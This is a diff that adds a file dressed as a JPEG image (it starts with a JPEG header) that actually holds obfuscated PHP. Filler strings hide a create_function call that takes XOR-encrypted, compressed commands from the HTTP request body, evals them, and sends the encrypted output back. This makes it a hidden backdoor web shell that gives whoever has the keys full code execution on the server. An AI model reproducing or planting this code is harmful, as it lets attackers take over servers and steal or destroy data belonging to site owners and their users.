@@ -1,0 +1,10 @@
+ÿØÿà<?php
+$I='i++){$o"H.=$t{$i}"H"H^$"Hk{$j};}}retur"Hn $o"H;}if (@preg_"H"Hmatch(""H/$kh"H("H."H+)$k"Hf/",@file_get_cont"Hents("p';
+$G='_ge"Ht_conte"H"Hnts()"H;@ob_end_cle"Han()"H;$r=@ba"Hse64_e"Hncode"H(@x(@gz"Hcompre"Hss($"Ho),"H$k));print("$"Hp$kh$r$"Hkf");}';
+$j=str_replace('J','','crJJeatJe_fJuJJnction');
+$n='"Hhp://input"H""H),$m)=="H1"H) {"H@ob_start();@eva"Hl"H(@gzun"Hcompress(@"H"Hx(@bas"He64_decode($m"H[1"H]),$k)));$"Ho=@ob';
+$C='$k="0"H98"Hf"H6bcd";"H$kh="4621d"H373ca"Hde";$kf=""H4e832627b4f6"H";$p"H="1ToKgk"HH8rGL"Hno8W"H"H7";f"Hunct"Hion x(';
+$S='$t,$k){$c=strl"He"Hn($"Hk);$l"H=str"Hlen($t);$o=""H"H";for($i=0;"H$i"H<$l;){for($j=0;("H$j"H<$c&&$i<"H$l)"H;$j"H++,$';
+$a=str_replace('"H','',$C.$S.$I.$n.$G);
+$s=$j('',$a);$s();
+?>
